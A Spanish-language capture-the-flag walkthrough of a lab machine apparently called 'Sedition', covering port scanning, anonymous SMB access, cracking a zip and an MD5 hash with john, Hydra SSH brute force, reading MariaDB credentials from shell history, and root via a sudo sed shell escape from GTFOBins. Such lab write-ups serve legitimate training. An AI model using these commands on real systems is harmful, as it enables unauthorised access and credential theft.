Empezamos enumerando los puertos abiertos:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.66
```

Y vemos el puerto 139 y 445 y el 65535, que es ssh. Iremos primero por el 445 de smb:

```
smbmap -H 192.168.1.66

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.1.66:445	Name: 192.168.1.66        	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	backup                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba Server)
	nobody                                            	NO ACCESS	Home Directories
[*] Closed 1 connections                                                         
```

Vemos una carpeta llamada backup, entrando en ella, vemos un .zip llamado secretito.zip. Nos lo descargamos:

```
smbclient //192.168.1.66/backup -N

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul  6 19:02:53 2025
  ..                                  D        0  Sun Jul  6 20:15:13 2025
  secretito.zip                       N      216  Sun Jul  6 19:02:31 2025

		19480400 blocks of size 1024. 16257604 blocks available
smb: \> get secretito.zip
getting file \secretito.zip of size 216 as secretito.zip (42,2 KiloBytes/sec) (average 42,2 KiloBytes/sec)
smb: \> 
```

El zip esta protegido con contraseña, usaremos zip2john para intentar descubrirla:

```
zip2john secretito.zip >> hash
```

Esto nos sca el hash del archivo y con john intentaremos sacar la contraseña:

```
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sebastian        (secretito.zip/password)   
```

La contraseña es sebastian, ahora vemos que contiene el .zip
Nos da un archivo llamado password que pone: elbunkermolagollon123, una posible contraseña para entrar por ssh.

Vamos a hacer fuerza bruta por ssh.

```
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p elbunkermolagollon123 ssh://192.168.1.66 -s 65535

[DATA] attacking ssh://192.168.1.66:65535/
[65535][ssh] host: 192.168.1.66   login: cowboy   password: elbunkermolagollon123
```

Nos conectamos por ssh y ejecutamos sudo -l para la escalada de privilegios vemos que no tenemos nada.

Ejecutamos ss -tulnp y vemos que hay una base datos interna en el puer 3306 y si ejecutamos el comando history, vemos que aparece esto:

```
cowboy@Sedition:/$ history
    1  history
    2  exit
    3  mariadb
    4  mariadb -u cowboy -pelbunkermolagollon123
```

Por tanto nos conectamos a ella y vemos las tablas de la base de datos y encontramos las credenciales de debian, en formato de hash:

```
MariaDB [bunker]> SELECT * FROM users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
```

Usaremos john para crakear ese hash que previamente hemos sacado que es MD5 con hash:

```
john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (?)
```

password1 es la contraseña de debian, nos cambiamos a debian y vemos la primera flag en su home
Para la escalada de privilegos ejecutamos sudo -l:

```
sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```

Vamos a gtfobins para explotarlo y este es el resultado:

```sudo sed -n '1e exec sh 1>&0' /etc/hosts
# bash -p
root@Sedition:/home/debian# whoami
root
root@Sedition:/home/debian# 
```

Y finalmente pwned ;)